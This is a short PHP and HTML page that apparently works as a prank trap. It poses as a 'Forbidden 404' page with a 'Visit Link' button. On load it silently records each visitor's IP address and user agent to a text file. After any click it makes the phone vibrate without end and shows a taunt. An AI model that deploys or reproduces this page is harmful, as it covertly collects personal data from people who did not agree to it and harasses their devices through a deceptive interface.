<?php
if(!empty($_SERVER['HTTP_CLIENT_IP'])){
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}else{
    $ip = $_SERVER["REMOTE_ADDR"];
}

$agent = $_SERVER["HTTP_USER_AGENT"];

$file = fopen("result.txt", 'w+');
$data = "[IP] > ".$ip." || "."[UserAgent] > ".$agent;
fputs($file, $data);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <title>Website</title>
</head>
<style>
.main{
    padding: 100%;
    background: white;
}
.main h1{
    position: absolute;
    margin-left: -96%;
    margin-top: -99%;
    font: 25px sans-serif;
    text-align: center;
}
.main p{
    font: 15px sans-serif;
    padding: 10px;
    background: ;
    position: absolute;
    margin-left: -80%;
    margin-top: -75%;
    text-decoration: underline;
    border-radius: 5px;
}

#g{
    position: absolute;
    margin-left: -56%;
    background: none;
    margin-top: -71%;
    font: 20px sans-serif;
    text-transform: uppercase;
}

#inf{
    position: absolute;
    margin-left: 26%;
    margin-top: 3%;
}

@media screen and (max-width: 375px){

}

</style>

<body>
    <div class="container">
    <div id="nav" class="alert alert-primary alert-fixed"><h1 class="alert alert-warning">Forbidden 404</h1></div>
    <p id="inf" class="alert alert-dark alert-fixed">Press button to access link</p>
    <div class="main"><br><p style="margin-left: -52%;" class="btn btn-danger btn-fixed">Visit Link</p><br><p2 class="alert alert-danger" id="g"></p></div>
</div>
    <canvas id="canv"></canvas>
        <script type="text/javascript">
        document.body.addEventListener('click', function(){
            setInterval(function(){
                navigator.vibrate([1000]);
                document.getElementById('g').innerHTML = "Mampus Geter";
            }, 10);
        })
         </script>
</body>

</html>